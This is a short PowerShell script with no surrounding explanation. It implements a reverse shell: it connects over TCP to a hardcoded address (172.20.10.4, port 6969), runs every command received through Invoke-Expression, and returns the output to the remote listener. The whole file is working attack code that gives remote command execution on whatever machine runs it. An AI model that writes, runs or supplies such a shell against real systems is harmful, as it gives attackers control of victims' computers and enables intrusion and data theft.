param (
    [string]$i = '172.20.10.4',
    [int]$p = 6969
)

try {
    $client = New-Object System.Net.Sockets.TCPClient($i, $p);
    $stream = $client.GetStream();
    $writer = New-Object System.IO.StreamWriter($stream);
    $writer.AutoFlush = $true;
    $buffer = New-Object System.Byte[] 1024;
    $encoding = New-Object System.Text.AsciiEncoding;

    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $command = $encoding.GetString($buffer, 0, $bytesRead);
        $result = Invoke-Expression $command 2>&1 | Out-String;
        $writer.Write($result);
        $writer.Flush();
    }
} catch {
    Write-Host "Error: $_"
} finally {
    $client.Close();
}
